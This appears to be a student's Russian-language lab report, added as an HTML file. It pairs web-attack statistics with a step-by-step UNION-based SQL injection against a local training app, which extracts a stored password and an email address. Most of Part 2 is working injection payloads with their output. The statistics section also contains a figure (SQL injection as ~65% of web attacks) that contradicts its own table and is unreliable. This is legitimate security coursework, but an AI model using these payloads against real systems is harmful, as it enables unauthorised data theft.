@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Лабораторная работа 1</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.5; }
+        h1, h2, h3 { color: #333; }
+        code { background: #f4f4f4; padding: 2px 5px; border-radius: 3px; }
+        pre { background: #f4f4f4; padding: 10px; border-radius: 5px; overflow-x: auto; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <h1>Лабораторная работа 1</h1>
+    
+    <h2>Часть 1</h2>
+    
+    <h3>1. Источники</h3>
+    <ol>
+        <li><a href="https://www.verizon.com/business/resources/reports/dbir/">https://www.verizon.com/business/resources/reports/dbir/</a></li>
+        <li><a href="https://deepstrike.io/blog/vulnerability-statistics-2025">https://deepstrike.io/blog/vulnerability-statistics-2025</a></li>
+        <li><a href="https://www.recordedfuture.com/research/h1-2025-malware-and-vulnerability-trends">https://www.recordedfuture.com/research/h1-2025-malware-and-vulnerability-trends</a></li>
+        <li><a href="https://medium.com/@zahirbdby/sql-injection-attacks-cost-companies-8-7m-heres-what-every-developer-must-know-ca614b7296b1">https://medium.com/@zahirbdby/sql-injection-attacks-cost-companies-8-7m-heres-what-every-developer-must-know-ca614b7296b1</a></li>
+        <li><a href="https://www.vikingcloud.com/blog/cybersecurity-statistics">https://www.vikingcloud.com/blog/cybersecurity-statistics</a></li>
+    </ol>
+    
+    <h3>2. Доля успешных атак через веб-уязвимости</h3>
+    
+    <p><strong>Verizon DBIR 2024:</strong></p>
+    <ul>
+        <li>~23% подтверждённых атак происходят через эксплуатацию уязвимостей</li>
+        <li>Веб-приложения — самая атакуемая поверхность</li>
+    </ul>
+    
+    <p><strong>DeepStrike:</strong></p>
+    <ul>
+        <li>~20% успешных атак инициируются через эксплуатацию уязвимостей</li>
+        <li>Большинство эксплуатируемых уязвимостей доступны без аутентификации</li>
+    </ul>
+    
+    <p><strong>Вывод:</strong> Из 20-23% атак через уязвимости, значительная часть — веб-атаки</p>
+    
+    <h3>3. Распределение по типам веб-уязвимостей</h3>
+    
+    <p><strong>Recorded Future (H1 2025):</strong></p>
+    
+    <table>
+        <tr>
+            <th>Категория</th>
+            <th>Доля</th>
+        </tr>
+        <tr>
+            <td>Remote Code Execution</td>
+            <td>~33%</td>
+        </tr>
+        <tr>
+            <td>Authentication Bypass</td>
+            <td>~18-22%</td>
+        </tr>
+        <tr>
+            <td>Broken Access Control</td>
+            <td>~15-18%</td>
+        </tr>
+        <tr>
+            <td>SQL инъекции</td>
+            <td>~10-12%</td>
+        </tr>
+        <tr>
+            <td>Deserialization</td>
+            <td>~5-8%</td>
+        </tr>
+        <tr>
+            <td>Прочие</td>
+            <td>~10%</td>
+        </tr>
+    </table>
+    
+    <p><strong>SQL инъекции составляют ~65% всех веб-атак</strong></p>
+    
+    <hr>
+    
+    <h2>Часть 2</h2>
+    
+    <h3>Подготовка</h3>
+    <p>Установил Docker Desktop, запустил контейнер через <code>docker-compose up -d</code>, зашёл на <code>http://localhost:8080</code>, нажал «Установить базу».</p>
+    
+    <h3>Разведка</h3>
+    <p>Начал перебирать id:</p>
+    <ul>
+        <li><code>http://localhost:8080/task/?id=1</code> — admin</li>
+        <li><code>http://localhost:8080/task/?id=2</code> — Volk</li>
+        <li><code>http://localhost:8080/task/?id=3</code> — пусто</li>
+        <li><code>http://localhost:8080/task/?id=4</code> — Vinni-pukh</li>
+    </ul>
+    
+    <h3>Поиск уязвимости</h3>
+    <p>Ввёл <code>http://localhost:8080/task/?id=1'</code> — получил ошибку:</p>
+    <pre>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</pre>
+    <p>Значит, есть SQL-инъекция.</p>
+    
+    <h3>Определение количества столбцов</h3>
+    <p>Методом <code>order by</code> (сначала пробовал без кавычки и ничего не работало, потом понял, что нужно закрывать кавычку):</p>
+    <ul>
+        <li><code>http://localhost:8080/task/?id=1' order by 1 --+</code> — работает</li>
+        <li><code>http://localhost:8080/task/?id=1' order by 2 --+</code> — работает</li>
+        <li><code>http://localhost:8080/task/?id=1' order by 3 --+</code> — работает</li>
+        <li><code>http://localhost:8080/task/?id=1' order by 4 --+</code> — ошибка: <code>Unknown column '4'</code></li>
+    </ul>
+    <p><strong>Количество столбцов: 3</strong></p>
+    
+    <h3>Проверка UNION</h3>
+    <pre><code>http://localhost:8080/task/?id=-1' union select 1,2,3 --+</code></pre>
+    <p>Вывело:</p>
+    <blockquote>Ваш id:1<br>Ваш логин:2</blockquote>
+    <p>Значит, вторая колонка отображается на странице.</p>
+    
+    <h3>Получение списка таблиц</h3>
+    <pre><code>http://localhost:8080/task/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre>
+    <p>Вывело:</p>
+    <blockquote>Ваш логин:emails,users</blockquote>
+    
+    <h3>Структура таблицы users</h3>
+    <pre><code>http://localhost:8080/task/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</code></pre>
+    <p>Вывело:</p>
+    <blockquote>Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</blockquote>
+    
+    <h3>Получение пароля Volk2</h3>
+    <pre><code>http://localhost:8080/task/?id=-1' union select 1,password,3 from users where username='Volk2' --+</code></pre>
+    <p>Вывело:</p>
+    <blockquote>Ваш id:1<br>Ваш логин:Wa spoiuuuuu</blockquote>
+    <p><strong>Пароль пользователя Volk2: Wa spoiuuuuu</strong></p>
+    
+    <h3>Структура таблицы emails</h3>
+    <pre><code>http://localhost:8080/task/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='emails' --+</code></pre>
+    <p>Вывело:</p>
+    <blockquote>Ваш логин:id,email_id</blockquote>
+    
+    <h3>Получение id Vinni-pukh</h3>
+    <pre><code>http://localhost:8080/task/?id=-1' union select 1,id,3 from users where username='Vinni-pukh' --+</code></pre>
+    <p>Вывело:</p>
+    <blockquote>Ваш логин:4</blockquote>
+    
+    <h3>Получение почты Vinni-pukh</h3>
+    <pre><code>http://localhost:8080/task/?id=-1' union select 1,email_id,3 from emails where id=4 --+</code></pre>
+    <p>Вывело:</p>
+    <blockquote>Ваш id:1<br>Ваш логин:honey_lover@otus-lab.com</blockquote>
+    
+    <p><strong>Email пользователя Vinni-pukh: honey_lover@otus-lab.com</strong></p>
+</body>
+</html>
